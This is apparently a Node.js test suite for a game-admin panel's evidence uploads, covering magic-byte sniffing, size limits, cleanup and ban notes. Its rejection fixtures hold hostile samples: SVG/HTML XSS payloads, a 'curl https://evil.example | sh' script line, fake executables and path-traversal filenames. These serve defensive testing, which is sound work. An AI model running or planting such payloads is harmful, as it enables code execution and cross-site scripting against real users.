'use strict';
// Evidence uploads and private ban notes (docs/BATCH3-CONTRACTS.md §1).
//
// UNIT — sniff (signatures, image ftyp brands, EBML DocType), parseRange
//   (single ranges only), cleanFilename, contentDisposition.
//
// IN-PROCESS HTTP — createApi with the evidence module as an extension over a
//   real db/auth/admin, a fake RCON and a temp data dir:
//   - every allowed type by magic bytes (the client's Content-Type and
//     extension never count), stored as <sha256>.<ext> byte for byte, listed,
//     audited, counted on ban and audit rows;
//   - SVG, HTML disguised as .png, markup anywhere in text, zip, executables,
//     #! scripts, HEIC, bad/NUL/oversized text and empty files are 415s that
//     leave no file and no row;
//   - the size cap from Content-Length (answered before the body) and from
//     the streamed count (no Content-Length), read live from config;
//   - temp files are gone after a refusal, a client disconnect mid-upload, a
//     disk-full write error (500) and a low-disk refusal (507); a removal the
//     OS refuses is retried, then left to the periodic sweep;
//   - the low-disk check counts what running uploads may still write;
//   - permissions per target (a warn-only role attaches to warn actions only;
//     ineligible and missing targets refused), CSRF still applies;
//   - dedupe (one file for many rows; the same bytes on the same item answer
//     the existing row), concurrent identical uploads, 20 live files per item,
//     soft delete + file removal once unreferenced, delete permissions;
//   - serving: sniffed Content-Type, nosniff, the exact sandbox CSP,
//     inline/attachment with an RFC 5987 name, private caching, ETag/304,
//     single Range for video (multi and malformed ranges served whole);
//   - no path from the client or the db reaches the filesystem;
//   - start() and the periodic sweep remove only stale temp files;
//   - POST /api/bans/:id/note: ban permission, cleaned, at most 2000, private
//     in ban lists, imported bans refused, audited without the text;
//   - with the real auth bus and webhook: evidence and note audits post
//     nothing to Discord.
const test = require('node:test');
const assert = require('node:assert');
const fs = require('node:fs');
const os = require('node:os');
const path = require('node:path');
const http = require('node:http');
const crypto = require('node:crypto');
const zlib = require('node:zlib');
const { EventEmitter } = require('node:events');

const { openDb } = require('../server/db');
const { createAuth } = require('../server/auth');
const { createAdmin } = require('../server/admin');
const { createApi } = require('../server/api');
const { createWebhook } = require('../server/webhook');
const { createEvidence, sniff, parseRange, cleanFilename, contentDisposition } = require('../server/evidence');
const LiveState = require('../server/state');

const MB = 1024 * 1024;
const DISCORD_URL = 'https://discord.example.test/api/webhooks/1/x';
const FILE_CSP = "sandbox; default-src 'none'; img-src 'self'; media-src 'self'; style-src 'unsafe-inline'";
const sha256 = (b) => crypto.createHash('sha256').update(b).digest('hex');

// --------------------------------------------------------------- fixtures

const PNG_HEAD = Buffer.from('89504e470d0a1a0a0000000d49484452', 'hex');

function ftyp(brand, tail) {
  const box = Buffer.alloc(24);
  box.writeUInt32BE(24, 0);
  box.write('ftyp', 4, 'latin1');
  box.write(brand, 8, 'latin1');
  box.writeUInt32BE(0x200, 12);
  box.write('isomiso2', 16, 'latin1');
  return Buffer.concat([box, crypto.randomBytes(tail)]);
}

function ebml(docType) {
  const dt = Buffer.from(docType, 'latin1');
  const body = Buffer.concat([
    Buffer.from([0x42, 0x86, 0x81, 0x01, 0x42, 0xf7, 0x81, 0x01, 0x42, 0xf2, 0x81, 0x04, 0x42, 0xf3, 0x81, 0x08]),
    Buffer.from([0x42, 0x82, 0x80 | dt.length]), dt,
    Buffer.from([0x42, 0x87, 0x81, 0x04, 0x42, 0x85, 0x81, 0x02]),
  ]);
  return Buffer.concat([Buffer.from([0x1a, 0x45, 0xdf, 0xa3, 0x80 | body.length]), body, crypto.randomBytes(300)]);
}

// A real archive: one stored file, central directory, end record.
function zipOf(name, text) {
  const data = Buffer.from(text);
  const fname = Buffer.from(name);
  const crc = zlib.crc32(data);
  const local = Buffer.alloc(30);
  local.writeUInt32LE(0x04034b50, 0);
  local.writeUInt16LE(20, 4);
  local.writeUInt32LE(crc, 14);
  local.writeUInt32LE(data.length, 18);
  local.writeUInt32LE(data.length, 22);
  local.writeUInt16LE(fname.length, 26);
  const central = Buffer.alloc(46);
  central.writeUInt32LE(0x02014b50, 0);
  central.writeUInt16LE(20, 4);
  central.writeUInt16LE(20, 6);
  central.writeUInt32LE(crc, 16);
  central.writeUInt32LE(data.length, 20);
  central.writeUInt32LE(data.length, 24);
  central.writeUInt16LE(fname.length, 28);
  const eocd = Buffer.alloc(22);
  eocd.writeUInt32LE(0x06054b50, 0);
  eocd.writeUInt16LE(1, 8);
  eocd.writeUInt16LE(1, 10);
  eocd.writeUInt32LE(central.length + fname.length, 12);
  eocd.writeUInt32LE(local.length + fname.length + data.length, 16);
  return Buffer.concat([local, fname, data, central, fname, eocd]);
}

// Fresh bytes per call (random tails), so each upload is new content.
const FIX = {
  png: () => Buffer.concat([PNG_HEAD, crypto.randomBytes(200)]),
  jpg: () => Buffer.concat([Buffer.from('ffd8ffe000104a46494600', 'hex'), crypto.randomBytes(200)]),
  gif: () => Buffer.concat([Buffer.from('GIF89a'), crypto.randomBytes(200)]),
  webp: () => {
    const b = Buffer.concat([Buffer.from('RIFF'), Buffer.alloc(4), Buffer.from('WEBPVP8 '), crypto.randomBytes(200)]);
    b.writeUInt32LE(b.length - 8, 4);
    return b;
  },
  mp4: () => ftyp('isom', 4096),
  mov: () => ftyp('qt  ', 300),
  webm: () => ebml('webm'),
  mkv: () => ebml('matroska'),
  pdf: () => Buffer.concat([Buffer.from('%PDF-1.7\n%\u00e2\u00e3\n1 0 obj\n'), crypto.randomBytes(200)]),
  txt: () => Buffer.from(`[ALL] Bob: stop teamkilling\n[TEAM] Ann: ok ${crypto.randomUUID()}\n`),
};

// ---------------------------------------------------------------- harness

async function waitFor(fn, label, timeoutMs = 4000) {
  const until = Date.now() + timeoutMs;
  for (;;) {
    if (fn()) return;
    if (Date.now() > until) throw new Error(`timed out waiting for ${label}`);
    await new Promise((r) => setTimeout(r, 10));
  }
}

// POST raw bytes. `chunked` streams them without a Content-Length;
// `declared` sends that Content-Length but only `body` (the server must
// answer from the headers), then hangs up.
function postRaw(base, p, cookie, body, { headers = {}, chunked = false, declared = null, origin = true } = {}) {
  return new Promise((resolve, reject) => {
    const h = { cookie, 'content-type': 'application/octet-stream' };
    if (origin) h.origin = base;
    if (chunked) h['transfer-encoding'] = 'chunked';
    else h['content-length'] = String(declared != null ? declared : body.length);
    const req = http.request(base + p, { method: 'POST', headers: Object.assign(h, headers) });
    let answered = false;
    req.on('response', (res) => {
      answered = true;
      const parts = [];
      res.on('data', (c) => parts.push(c));
      res.on('end', () => {
        const text = Buffer.concat(parts).toString('utf8');
        let json = null;
        try { json = JSON.parse(text); } catch (_e) { json = null; }
        if (declared != null) req.destroy();
        resolve({ status: res.statusCode, headers: res.headers, json, text });
      });
    });
    req.on('error', (e) => { if (!answered) reject(e); });
    if (declared != null) {
      req.write(body);
      return;
    }
    if (!chunked) {
      req.end(body);
      return;
    }
    let off = 0;
    const pump = () => {
      while (off < body.length) {
        const piece = body.subarray(off, off + 64 * 1024);
        off += piece.length;
        if (!req.write(piece)) return req.once('drain', pump);
      }
      return req.end();
    };
    pump();
  });
}

// GET with a raw path (no client-side normalization).
function getRaw(base, p, cookie) {
  return new Promise((resolve, reject) => {
    const req = http.request(base + '/', { method: 'GET', path: p, headers: { cookie } }, (res) => {
      const parts = [];
      res.on('data', (c) => parts.push(c));
      res.on('end', () => resolve({ status: res.statusCode, body: Buffer.concat(parts) }));
    });
    req.on('error', reject);
    req.end();
  });
}

// `webhook`: auth emits on a bus wired to the real Discord webhook, whose
// posts are recorded in `posts` instead of sent.
async function harness(t, { maxMB = 1, minFreeBytes, sweepMs, webhook = false } = {}) {
  const dataDir = fs.mkdtempSync(path.join(os.tmpdir(), 'squadwatch-evidence-'));
  const storeDir = path.join(dataDir, 'evidence');
  const db = openDb(':memory:');
  db.migrate();
  const cfg = { web: {}, evidence: { maxMB } };
  const posts = [];
  let bus = null;
  if (webhook) {
    bus = new EventEmitter();
    cfg.discordWebhook = DISCORD_URL;
    cfg.webhookEvents = { bans: true, kicks: true, warns: true };
    const realFetch = globalThis.fetch;
    t.mock.method(globalThis, 'fetch', (url, init) => {
      if (!String(url).startsWith(DISCORD_URL)) return realFetch(url, init);
      posts.push(JSON.parse(init.body));
      return Promise.resolve(new Response(null, { status: 204 }));
    });
    createWebhook({ config: cfg, bus });
  }
  const auth = createAuth({ db, config: cfg, bus });
  const rcon = {
    status: { connected: true, authed: true },
    async exec(cmd) { return `Executed: ${cmd}`; },
  };
  const state = new LiveState();
  const admin = createAdmin({ db, rcon, state, auth, config: cfg });
  const logs = [];
  const log = {
    info() {},
    warn: (tag, msg) => logs.push(`warn ${tag} ${msg}`),
    error: (tag, msg) => logs.push(`error ${tag} ${msg}`),
  };
  const evidence = createEvidence({
    db, config: cfg, log, bus, state, admin, auth, webhook: null, dataDir,
    settings: { apply() { throw new Error('unused'); } }, minFreeBytes, sweepMs,
  });
  const server = createApi({ db, state, rcon, auth, admin, config: cfg, extensions: [evidence] });
  evidence.start();
  await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
  t.after(async () => {
    evidence.stop();
    await new Promise((resolve) => server.close(resolve));
    auth.loginLimiter.stop();
    db.close();
    fs.rmSync(dataDir, { recursive: true, force: true, maxRetries: 10, retryDelay: 50 });
  });
  const base = `http://127.0.0.1:${server.address().port}`;

  let n = 0;
  // A logged-in client for a builtin role name or a custom perms object.
  function as(role) {
    n++;
    let roleRef = role;
    if (role && typeof role === 'object') roleRef = auth.createRole(`custom-${n}`, role).id;
    const user = auth.createUser(`user${n}`, 'password-123', roleRef);
    const cookie = `sw_session=${auth.createSession(user.id, {}).token}`;
    const call = async (method, p, body) => {
      const headers = { origin: base, accept: 'application/json', cookie };
      const init = { method, headers };
      if (method !== 'GET') {
        headers['content-type'] = 'application/json';
        init.body = JSON.stringify(body == null ? {} : body);
      }
      const res = await fetch(base + p, init);
      const text = await res.text();
      let json = null;
      try { json = JSON.parse(text); } catch (_e) { json = null; }
      return { status: res.status, json, text, headers: res.headers };
    };
    return {
      user,
      cookie,
      get: (p) => call('GET', p),
      post: (p, body) => call('POST', p, body),
      upload(target, body, opts = {}) {
        const q = new URLSearchParams({ targetType: target.type, targetId: String(target.id) });
        if (opts.filename !== null) q.set('filename', opts.filename === undefined ? 'file.bin' : opts.filename);
        if (opts.caption != null) q.set('caption', opts.caption);
        return postRaw(base, `/api/evidence?${q}`, cookie, body, opts);
      },
      async file(url, headers = {}) {
        const res = await fetch(base + url, { headers: Object.assign({ cookie }, headers) });
        return { status: res.status, headers: res.headers, body: Buffer.from(await res.arrayBuffer()) };
      },
    };
  }

  const files = () => {
    try { return fs.readdirSync(storeDir).sort(); } catch (_e) { return []; }
  };
  return {
    db, auth, cfg, base, storeDir, logs, evidence, as, files, posts,
    temps: () => files().filter((f) => f.startsWith('.upload-')),
    rows: () => db.prepare('SELECT * FROM evidence ORDER BY id').all(),
    audits: (action) => db.prepare('SELECT * FROM admin_actions WHERE action = ? ORDER BY id').all(action),
  };
}

// A player plus a warn, a kick and a panel ban on them, all through the API.
async function seed(h, owner) {
  const now = Date.now();
  const pid = h.db.prepare('INSERT INTO players(eos_id, steam_id, name, first_seen, last_seen) VALUES(?,?,?,?,?)')
    .run('0002aaaabbbbccccddddeeeeffff0001', '76561198000000001', 'Griefer', now, now).lastInsertRowid;
  const warn = await owner.post('/api/admin/warn', { playerId: pid, message: 'Stop teamkilling' });
  assert.strictEqual(warn.status, 200, warn.text);
  const kick = await owner.post('/api/admin/kick', { playerId: pid, reason: 'Teamkilling' });
  assert.strictEqual(kick.status, 200, kick.text);
  const ban = await owner.post('/api/bans', { playerId: pid, interval: '1d', reason: 'TK spree', note: 'clip on medal' });
  assert.strictEqual(ban.status, 200, ban.text);
  return {
    pid,
    ban: { type: 'ban', id: ban.json.ban.id },
    warnAction: { type: 'action', id: warn.json.actionId },
    kickAction: { type: 'action', id: kick.json.actionId },
    banAction: { type: 'action', id: ban.json.actionId },
  };
}

function extraBan(h, pid) {
  return {
    type: 'ban',
    id: h.db.prepare('INSERT INTO bans(player_id, issued_at, reason, active) VALUES(?,?,?,1)')
      .run(pid == null ? null : pid, Date.now(), 'extra').lastInsertRowid,
  };
}

// ------------------------------------------------------------------- UNIT

test('sniff: signatures decide; HEIC/AVIF ftyp and unknown EBML doc types are not video', () => {
  assert.strictEqual(sniff(FIX.png()).mime, 'image/png');
  assert.strictEqual(sniff(FIX.jpg()).mime, 'image/jpeg');
  assert.strictEqual(sniff(Buffer.from('GIF87a')).mime, 'image/gif');
  assert.strictEqual(sniff(FIX.webp()).mime, 'image/webp');
  assert.strictEqual(sniff(FIX.mp4()).mime, 'video/mp4');
  assert.strictEqual(sniff(ftyp('mp42', 10)).mime, 'video/mp4');
  assert.strictEqual(sniff(FIX.mov()).mime, 'video/quicktime');
  assert.strictEqual(sniff(FIX.webm()).mime, 'video/webm');
  assert.strictEqual(sniff(FIX.mkv()).mime, 'video/x-matroska');
  assert.strictEqual(sniff(FIX.pdf()).mime, 'application/pdf');
  for (const b of [
    ftyp('heic', 10), ftyp('avif', 10), ftyp('mif1', 10), ebml('dvd'), Buffer.from('RIFF\0\0\0\0WAVE'),
    Buffer.from([0x89, 0x50, 0x4e]), Buffer.from('%PDF'), Buffer.from('<svg/>'), Buffer.alloc(0),
    Buffer.concat([Buffer.alloc(4), Buffer.from('ftyp'), Buffer.from([1, 2, 3, 4])]),
  ]) {
    assert.strictEqual(sniff(b), null, b.toString('latin1', 0, 16));
  }
});

test('parseRange: one range only; malformed and multiple ranges are ignored, past the end is unsatisfiable', () => {
  assert.deepStrictEqual(parseRange('bytes=0-99', 1000), { start: 0, end: 99 });
  assert.deepStrictEqual(parseRange('bytes=900-', 1000), { start: 900, end: 999 });
  assert.deepStrictEqual(parseRange('bytes=-100', 1000), { start: 900, end: 999 });
  assert.deepStrictEqual(parseRange('bytes=-5000', 1000), { start: 0, end: 999 });
  assert.deepStrictEqual(parseRange('bytes=990-5000', 1000), { start: 990, end: 999 });
  assert.strictEqual(parseRange('bytes=1000-', 1000), 'unsatisfiable');
  assert.strictEqual(parseRange('bytes=-0', 1000), 'unsatisfiable');
  for (const h of [
    undefined, '', 'bytes=', 'bytes=-', 'bytes=5-1', 'bytes=0-1,5-6', 'bytes=0-1, 5-6', 'items=0-1', 'bytes = 0-1',
    'bytes=0x10-', 'bytes=--1', 'bytes=1e3-', 'bytes=0-9999999999999999', 'bytes=-1-2', ' bytes=0-1',
  ]) {
    assert.strictEqual(parseRange(h, 1000), null, String(h));
  }
});

test('cleanFilename / contentDisposition: no path, no hidden characters, the type\'s extension, RFC 5987', () => {
  const T = { png: { ext: 'png', exts: ['png'] }, txt: { ext: 'txt', exts: ['txt', 'log'] } };
  assert.strictEqual(cleanFilename('../../etc/passwd', T.txt), 'passwd.txt');
  assert.strictEqual(cleanFilename('C:\\Users\\x\\desk.ini', T.txt), 'desk.ini.txt');
  assert.strictEqual(cleanFilename('evil.html', T.txt), 'evil.html.txt');
  assert.strictEqual(cleanFilename('server.LOG', T.txt), 'server.LOG');
  assert.strictEqual(cleanFilename('report.csv', T.txt), 'report.csv.txt');
  assert.strictEqual(cleanFilename('\u202Egnp.exe', T.png), 'gnp.exe.png');
  assert.strictEqual(cleanFilename('a\u200b:b|c?*.png', T.png), 'a_b_c__.png');
  assert.strictEqual(cleanFilename('CON.png', T.png), '_CON.png');
  assert.strictEqual(cleanFilename('  ...hidden.png. ', T.png), 'hidden.png');
  assert.strictEqual(cleanFilename('', T.png), 'evidence.png');
  assert.strictEqual(cleanFilename(null, T.png), 'evidence.png');
  assert.strictEqual(cleanFilename('/', T.png), 'evidence.png');
  const long = cleanFilename(`${'ü'.repeat(300)}.png`, T.png);
  assert.strictEqual([...long].length, 120);
  assert.ok(long.endsWith('.png'));
  assert.strictEqual(cleanFilename(`x\ud800y.png`, T.png), 'x\ufffdy.png', 'lone surrogates made well-formed');

  assert.strictEqual(contentDisposition('inline', 'a b ü"%\\.png'),
    'inline; filename="a b ____.png"; filename*=UTF-8\'\'a%20b%20%C3%BC%22%25%5C.png');
  assert.strictEqual(contentDisposition('attachment', "it's (1)*.txt"),
    'attachment; filename="it\'s (1)*.txt"; filename*=UTF-8\'\'it%27s%20%281%29%2A.txt');
});

// ------------------------------------------------------- IN-PROCESS: types

test('magic bytes decide the type: each allowed kind is stored as <sha256>.<ext>, listed, audited, counted', async (t) => {
  const h = await harness(t, { maxMB: 2 });
  const owner = h.as('owner');
  const w = await seed(h, owner);
  const cases = [
    ['png', 'shot.png', 'image/png'],
    ['jpg', 'shot.jpeg', 'image/jpeg'],
    ['gif', 'anim.gif', 'image/gif'],
    ['webp', 'pic.webp', 'image/webp'],
    ['mp4', 'clip.mp4', 'video/mp4'],
    ['mov', 'clip.MOV', 'video/quicktime'],
    ['webm', 'clip.webm', 'video/webm'],
    ['mkv', 'clip.mkv', 'video/x-matroska'],
    ['pdf', 'report.pdf', 'application/pdf'],
    ['txt', 'chat.log', 'text/plain'],
  ];
  const made = [];
  for (const [kind, filename, mime] of cases) {
    const bytes = FIX[kind]();
    // The client's header always claims PNG: it never counts.
    const r = await owner.upload(w.ban, bytes, { filename, headers: { 'content-type': 'image/png' } });
    assert.strictEqual(r.status, 200, `${kind}: ${r.text}`);
    const e = r.json.evidence;
    assert.strictEqual(r.json.ok, true);
    assert.strictEqual(r.json.duplicate, undefined);
    assert.deepStrictEqual(Object.keys(e).sort(), [
      'caption', 'filename', 'id', 'mime', 'size', 'targetId', 'targetType', 'uploadedAt', 'uploadedBy', 'uploader', 'url',
    ]);
    assert.strictEqual(e.mime, mime, kind);
    assert.strictEqual(e.size, bytes.length);
    assert.strictEqual(e.filename, filename);
    assert.strictEqual(e.targetType, 'ban');
    assert.strictEqual(e.targetId, w.ban.id);
    assert.strictEqual(e.uploadedBy, owner.user.id);
    assert.strictEqual(e.uploader, owner.user.username);
    assert.strictEqual(e.caption, null);
    assert.strictEqual(e.url, `/api/evidence/${e.id}/file`);
    assert.ok(Math.abs(e.uploadedAt - Date.now()) < 60000);
    assert.deepStrictEqual(fs.readFileSync(path.join(h.storeDir, `${sha256(bytes)}.${kind}`)), bytes, `${kind} stored byte for byte`);
    made.push(e);
  }
  assert.deepStrictEqual(h.temps(), []);
  assert.ok(h.files().every((f) => /^[0-9a-f]{64}\.[a-z0-9]+$/.test(f)), 'only content-addressed names on disk');

  const list = await owner.get(`/api/evidence?targetType=ban&targetId=${w.ban.id}`);
  assert.strictEqual(list.status, 200, list.text);
  assert.deepStrictEqual(list.json.rows, made, 'upload order, same shape as the upload answer');
  assert.strictEqual(list.json.maxMB, h.cfg.evidence.maxMB, 'the live upload limit rides along');
  assert.deepStrictEqual((await owner.get(`/api/evidence?targetType=ban&targetId=${w.ban.id + 99}`)).json.rows, []);

  const audits = h.audits('evidence-upload');
  assert.strictEqual(audits.length, cases.length);
  assert.strictEqual(audits[0].user_id, owner.user.id);
  assert.strictEqual(audits[0].target_player_id, w.pid);
  assert.deepStrictEqual(JSON.parse(audits[0].details), {
    targetType: 'ban', targetId: w.ban.id, filename: 'shot.png', size: made[0].size, sha256: h.rows()[0].sha256,
  });

  const bans = await owner.get('/api/bans');
  assert.strictEqual(bans.json.rows.find((b) => b.id === w.ban.id).evidenceCount, cases.length, 'ban rows count evidence');
  const onAction = await owner.upload(w.warnAction, FIX.png(), { filename: 'tk.png' });
  assert.strictEqual(onAction.status, 200, onAction.text);
  const audit = await owner.get('/api/audit?action=warn');
  assert.strictEqual(audit.json.rows[0].id, w.warnAction.id);
  assert.strictEqual(audit.json.rows[0].evidenceCount, 1, 'audit rows count evidence');
});

test('everything else is a 415 — SVG, HTML disguised as .png, zip, executables, scripts, bad text, empty — leaving nothing behind', async (t) => {
  const h = await harness(t, { maxMB: 5 });
  const owner = h.as('owner');
  const w = await seed(h, owner);
  const cases = [
    ['svg', 'logo.svg', Buffer.from('<svg xmlns="http://www.w3.org/2000/svg" onload="alert(1)"><circle r="5"/></svg>')],
    ['svg after a BOM, blank lines and an XML prolog', 'logo.png',
      Buffer.from('\ufeff\n\n  <?xml version="1.0"?>\n<svg xmlns="http://www.w3.org/2000/svg"><script>alert(1)</script></svg>')],
    ['html disguised as .png', 'cat.png',
      Buffer.from('<!DOCTYPE html><html><body><script>fetch("/api/users")</script></body></html>')],
    ['html comment first', 'cat.png', Buffer.from('<!-- x --><img src=x onerror=alert(1)>')],
    ['bare tag first', 'cat.png', Buffer.from('<img src=x onerror=alert(1)>')],
    ['markup deep inside a text file', 'chat.txt',
      Buffer.from(`${'[ALL] Bob: gg\n'.repeat(400)}<iframe src="https://evil.example"></iframe>\n`)],
    ['zip', 'evidence.zip', zipOf('a.txt', 'hello there')],
    ['zip named .png', 'shot.png', zipOf('payload.exe', 'MZ fake')],
    ['empty zip', 'x.png', Buffer.concat([Buffer.from('PK\u0005\u0006'), Buffer.alloc(18)])],
    ['windows executable', 'clip.mp4', Buffer.concat([Buffer.from('MZ'), Buffer.from([0x90, 0x00, 0x03, 0x00]), crypto.randomBytes(200)])],
    ['elf executable', 'clip.mp4', Buffer.concat([Buffer.from([0x7f, 0x45, 0x4c, 0x46, 0x02, 0x01, 0x01, 0x00]), crypto.randomBytes(200)])],
    ['gzip', 'log.txt', zlib.gzipSync(Buffer.from('hello '.repeat(50)))],
    ['shell script', 'run.txt', Buffer.from('#!/bin/sh\ncurl https://evil.example | sh\n')],
    ['HEIC still image', 'photo.heic', ftyp('heic', 300)],
    ['invalid UTF-8', 'chat.txt', Buffer.from([0x68, 0x69, 0xc3, 0x28, 0x0a])],
    ['UTF-8 cut off at the end', 'chat.txt', Buffer.from([0x68, 0x69, 0xe2, 0x82])],
    ['NUL in text', 'chat.txt', Buffer.from('hello\u0000world')],
    ['UTF-16 text', 'chat.txt', Buffer.from('\ufeffhello world', 'utf16le')],
    ['text over 2 MB', 'big.txt', Buffer.alloc(2 * MB + 1, 0x61)],
    ['empty', 'x.png', Buffer.alloc(0)],
  ];
  for (const [label, filename, bytes] of cases) {
    const r = await owner.upload(w.ban, bytes, { filename });
    assert.strictEqual(r.status, 415, `${label}: ${r.text}`);
    assert.match(r.json.error, /unsupported file type|empty/, label);
  }
  const chunkedEmpty = await owner.upload(w.ban, Buffer.alloc(0), { filename: 'x.png', chunked: true });
  assert.strictEqual(chunkedEmpty.status, 415, chunkedEmpty.text);
  assert.match(chunkedEmpty.json.error, /empty/);
  assert.deepStrictEqual(h.files(), [], 'no temp file and no stored file');
  assert.deepStrictEqual(h.rows(), []);
  assert.strictEqual(h.audits('evidence-upload').length, 0);

  // Exactly 2 MB of text is still text; plain prose mentioning tags is fine.
  const ok = await owner.upload(w.ban, Buffer.alloc(2 * MB, 0x61), { filename: 'big.txt' });
  assert.strictEqual(ok.status, 200, ok.text);
  const prose = await owner.upload(w.ban, Buffer.from('he said the <b> tag is bold & 2 < 3 > 1\n'), { filename: 'chat.txt' });
  assert.strictEqual(prose.status, 200, prose.text);
});

// ------------------------------------------------- IN-PROCESS: limits, cleanup

test('size cap: Content-Length over it is answered from the headers; a streamed body is counted; read live', async (t) => {
  const h = await harness(t, { maxMB: 1 });
  const owner = h.as('owner');
  const w = await seed(h, owner);

  const early = await owner.upload(w.ban, FIX.png().subarray(0, 100), { declared: MB + 1, filename: 'big.png' });
  assert.strictEqual(early.status, 413, early.text);
  assert.match(early.json.error, /limit is 1 MB/);

  const big = Buffer.concat([PNG_HEAD, crypto.randomBytes(MB + 64 * 1024)]);
  const streamed = await owner.upload(w.ban, big, { chunked: true, filename: 'big.png' });
  assert.strictEqual(streamed.status, 413, streamed.text);
  assert.match(streamed.json.error, /limit is 1 MB/);
  assert.deepStrictEqual(h.files(), [], 'the temp file is gone before the answer');
  assert.deepStrictEqual(h.rows(), []);

  const exact = Buffer.concat([PNG_HEAD, crypto.randomBytes(MB - PNG_HEAD.length)]);
  const atLimit = await owner.upload(w.ban, exact, { filename: 'max.png', chunked: true });
  assert.strictEqual(atLimit.status, 200, atLimit.text);
  assert.strictEqual(atLimit.json.evidence.size, MB);

  h.cfg.evidence.maxMB = 2; // the Settings API edits config in place
  const later = await owner.upload(w.ban, big, { filename: 'big.png' });
  assert.strictEqual(later.status, 200, later.text);
  assert.deepStrictEqual(h.temps(), []);
});

test('a client that disconnects mid-upload leaves no temp file and no row', async (t) => {
  const h = await harness(t, { maxMB: 1 });
  const owner = h.as('owner');
  const w = await seed(h, owner);
  const q = new URLSearchParams({ targetType: 'ban', targetId: String(w.ban.id), filename: 'cut.png' });
  const req = http.request(`${h.base}/api/evidence?${q}`, {
    method: 'POST',
    headers: { origin: h.base, cookie: owner.cookie, 'content-length': String(512 * 1024) },
  });
  req.on('error', () => {});
  req.write(Buffer.concat([PNG_HEAD, crypto.randomBytes(100 * 1024)]));
  await waitFor(() => h.temps().length === 1, 'the temp file');
  req.destroy();
  await waitFor(() => h.temps().length === 0, 'the temp file removed');
  assert.deepStrictEqual(h.files(), []);
  assert.deepStrictEqual(h.rows(), []);
  const after = await owner.upload(w.ban, FIX.png(), { filename: 'ok.png' });
  assert.strictEqual(after.status, 200, 'the store still works');
});

test('a client gone while the checks run (before the body is read) leaves no temp file either', async (t) => {
  const h = await harness(t, { maxMB: 1 });
  const owner = h.as('owner');
  const w = await seed(h, owner);
  const realStatfs = fs.promises.statfs;
  let release;
  const gate = new Promise((r) => { release = r; });
  let entered;
  const inChecks = new Promise((r) => { entered = r; });
  t.mock.method(fs.promises, 'statfs', async (...args) => {
    entered();
    await gate;
    return realStatfs.apply(fs.promises, args);
  });
  const q = new URLSearchParams({ targetType: 'ban', targetId: String(w.ban.id), filename: 'gone.png' });
  const req = http.request(`${h.base}/api/evidence?${q}`, {
    method: 'POST',
    headers: { origin: h.base, cookie: owner.cookie, 'content-length': String(64 * 1024) },
  });
  req.on('error', () => {});
  req.write(Buffer.concat([PNG_HEAD, crypto.randomBytes(1000)]));
  await inChecks;
  req.destroy();
  await new Promise((r) => setTimeout(r, 100)); // the server sees the close
  release();
  await new Promise((r) => setTimeout(r, 200));
  assert.deepStrictEqual(h.temps(), [], 'no temp file was ever left open');
  assert.deepStrictEqual(h.rows(), []);
});

test('a write error (disk full) is a clean 500: no temp file, no stored file, no row', async (t) => {
  const h = await harness(t, { maxMB: 1 });
  const owner = h.as('owner');
  const w = await seed(h, owner);
  const realCreate = fs.createWriteStream;
  const failing = t.mock.method(fs, 'createWriteStream', function createFailing(p, opts) {
    const ws = realCreate.call(fs, p, opts);
    ws.write = function write() {
      process.nextTick(() => ws.destroy(Object.assign(new Error('ENOSPC: no space left on device, write'), { code: 'ENOSPC' })));
      return false;
    };
    return ws;
  });
  for (const chunked of [false, true]) {
    const r = await owner.upload(w.ban, Buffer.concat([PNG_HEAD, crypto.randomBytes(300 * 1024)]), { filename: 'x.png', chunked });
    assert.strictEqual(r.status, 500, r.text);
    assert.match(r.json.error, /out of disk space/);
    assert.deepStrictEqual(h.files(), [], 'nothing partial left');
  }
  assert.strictEqual(failing.mock.callCount(), 2);
  assert.deepStrictEqual(h.rows(), []);
  assert.ok(h.logs.some((l) => /ENOSPC/.test(l)), 'logged');
  failing.mock.restore();
  assert.strictEqual((await owner.upload(w.ban, FIX.png(), { filename: 'ok.png' })).status, 200);
});

test('a rename or delete refused while antivirus holds the file is tried again; one that stays refused is a clean 500', async (t) => {
  const h = await harness(t, { maxMB: 1 });
  const owner = h.as('owner');
  const w = await seed(h, owner);
  const busy = (op) => Object.assign(new Error(`EPERM: operation not permitted, ${op}`), { code: 'EPERM' });
  const realRename = fs.renameSync;
  let renameRefusals = 2;
  const rename = t.mock.method(fs, 'renameSync', (a, b) => {
    if (renameRefusals > 0) {
      renameRefusals--;
      throw busy('rename');
    }
    return realRename.call(fs, a, b);
  });
  const bytes = FIX.png();
  const ok = await owner.upload(w.ban, bytes, { filename: 'p.png' });
  assert.strictEqual(ok.status, 200, ok.text);
  assert.strictEqual(renameRefusals, 0, 'refused twice, then placed');
  const file = path.join(h.storeDir, `${sha256(bytes)}.png`);
  assert.deepStrictEqual(fs.readFileSync(file), bytes);
  assert.deepStrictEqual(h.temps(), []);

  renameRefusals = Infinity;
  const stuck = await owner.upload(w.ban, FIX.png(), { filename: 'q.png' });
  assert.strictEqual(stuck.status, 500, stuck.text);
  assert.deepStrictEqual(h.temps(), [], 'the temp file is still removed');
  assert.strictEqual(h.rows().length, 1);
  rename.mock.restore();

  const realRm = fs.rmSync;
  let rmRefusals = 1;
  const rm = t.mock.method(fs, 'rmSync', (p, opts) => {
    if (p === file && rmRefusals > 0) {
      rmRefusals--;
      throw busy('unlink');
    }
    return realRm.call(fs, p, opts);
  });
  const del = await owner.post(`${ok.json.evidence.url.replace(/\/file$/, '')}/delete`, {});
  assert.strictEqual(del.status, 200, del.text);
  assert.ok(fs.existsSync(file), 'busy at first');
  await waitFor(() => !fs.existsSync(file), 'removed on a retry', 3000);
  rm.mock.restore();
});

test('an upload that would leave the disk nearly full is a 507 before anything is written', async (t) => {
  const probe = fs.mkdtempSync(path.join(os.tmpdir(), 'squadwatch-statfs-'));
  let statfsWorks = true;
  try { await fs.promises.statfs(probe); } catch (_e) { statfsWorks = false; }
  fs.rmSync(probe, { recursive: true, force: true });
  if (!statfsWorks) return t.skip('statfs unavailable here');
  const h = await harness(t, { minFreeBytes: Number.MAX_SAFE_INTEGER });
  const owner = h.as('owner');
  const w = await seed(h, owner);
  const r = await owner.upload(w.ban, FIX.png(), { filename: 'x.png' });
  assert.strictEqual(r.status, 507, r.text);
  assert.match(r.json.error, /low on disk space/);
  assert.deepStrictEqual(h.files(), []);
  assert.deepStrictEqual(h.rows(), []);
  return undefined;
});

test('the low-disk check counts what running uploads may still write, and frees it when each ends', async (t) => {
  let free;
  try {
    const s = await fs.promises.statfs(os.tmpdir());
    free = Number(s.bavail) * Number(s.bsize);
  } catch (_e) {
    return t.skip('statfs unavailable here');
  }
  const L = 100 * MB;
